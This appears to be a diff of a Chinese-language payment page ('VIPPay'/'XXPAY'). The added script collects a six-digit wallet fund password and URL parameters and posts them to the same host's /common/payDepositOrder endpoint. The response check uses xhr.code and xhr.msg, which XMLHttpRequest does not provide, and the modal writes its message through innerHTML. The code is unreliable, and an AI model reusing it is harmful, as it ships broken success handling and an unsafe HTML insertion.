@@ -6,7 +6,6 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>One Pager</title>
-    <link rel="stylesheet" href="assets/css/styles.css">
     <style>
         @import url(https://db.onlinewebfonts.com/c/dd4320757ff990fa3d23662f08aa6f3a?family=Central+W01+Bold);
 
@@ -208,6 +207,7 @@
             justify-content: center;
             background: #f5b410;
             border-radius: 2rem;
+
             margin-top: -.2rem;
         }
     </style>
@@ -220,7 +220,7 @@
     <span>VIPPay</span>
 </header>
 <main>
-    <div class="title">XXPAY</div>
+    <div id="title" class="title">XXPAY</div>
     <div class="main-container">
         <div class="first">
             <div class="info">订单编号:</div>
@@ -243,7 +243,8 @@
         <div class="third">
             <div class="label">您的钱包资金密码:</div>
             <label>
-                <input type="password"/>
+                <input type="tel" pattern="[0-9]*" style="-webkit-text-security:disc"
+                       onkeyup="value=value.replace(/[^\d]/g,'')" placeholder="输入密码">
             </label>
         </div>
         <div class="fourth">
@@ -253,11 +254,121 @@
             <br>
             请使用钱包管理,完善個人資料後設置。
         </div>
-        <div class="button">
+        <div id="submitButton" class="button">
             确定
         </div>
     </div>
 </main>
+<script>
+
+</script>
+
+<script>
+
+    // Initialize an empty object for the request body
+    const requestBody = {};
+
+    // Get the current URL and create a URL object
+    const currentURL = window.location.href;
+    const urlObject = new URL(currentURL);
+    // console.log(urlObject)
+    // Populate the object with URL parameters
+    requestBody.s = (new URLSearchParams(urlObject.search)).get('s');
+    requestBody.t = (new URLSearchParams(urlObject.search)).get('t');
+
+    // Target the password input field
+    const passwordInput = document.querySelector('.third input[type="tel"]');
+    let passwordValue = ""; // To store the password
+
+    // Listen for changes in the password input field
+    passwordInput.addEventListener('input', function (event) {
+        passwordValue = event.target.value;
+    });
+
+    // let title = document.getElementById('title')
+    // title.innerHTML = urlObject
+
+    function showModal(message) {
+        // Create the outer modal div
+        const modal = document.createElement('div');
+        modal.style.position = 'fixed';
+        modal.style.top = '0';
+        modal.style.left = '0';
+        modal.style.width = '100%';
+        modal.style.height = '100%';
+        modal.style.backgroundColor = 'rgba(0,0,0,0.5)';
+        modal.style.display = 'flex';
+        modal.style.justifyContent = 'center';
+        modal.style.alignItems = 'center';
+
+        // Create the inner white container div
+        const container = document.createElement('div');
+        container.style.backgroundColor = 'white';
+        container.style.padding = '20px';
+        container.style.borderRadius = '10px';
+        container.style.color = 'black';
+
+        // Add the message to the container
+        container.innerHTML = `<p>${message}</p>`;
+
+        // Append the container to the modal
+        modal.appendChild(container);
+
+        // Append the modal to the body
+        document.body.appendChild(modal);
+
+        // Click to close the modal
+        modal.addEventListener('click', function () {
+            document.body.removeChild(modal);
+        });
+    }
+
+    // Add event listener to the submit button
+    const submitButton = document.getElementById('submitButton');
+    submitButton.addEventListener('click', function () {
+        // Validate the password
+        if (passwordValue.trim() === "") {
+            // Show the modal with an error message for empty password
+            showModal("请输入您的钱包资金密码");
+        } else if (/^\d{6}$/.test(passwordValue)) {
+            // Update the password in the request body
+            requestBody.p = passwordValue;
+
+            // Initialize a new XMLHttpRequest
+            const xhr = new XMLHttpRequest();
+            const url = `${urlObject.protocol}//${urlObject.hostname}/common/payDepositOrder`;
+            xhr.open('POST', url, true);
+            xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
+
+            // Event handler for successful response
+            xhr.onload = function () {
+                if (xhr.code === 200) {
+                    // Show a static success message in a modal
+                    showModal("支付成功");
+                } else {
+                    // Show a static failure message in a modal
+                    showModal(xhr.msg);
+                }
+            };
+
+            // Event handler for request errors
+            xhr.onerror = function () {
+                // Handle network errors (you can also show this in a modal)
+                showModal("Network error.");
+            };
+
+            // Send the request
+            xhr.send(JSON.stringify(requestBody));
+        } else {
+            // Show the modal with an error message for invalid password
+            showModal("资金密码必须是6位数字");
+        }
+    });
+
+    setTimeout(function () {
+        passwordInput.focus()
+    }, 100)
+</script>
 </body>
 
 </html>
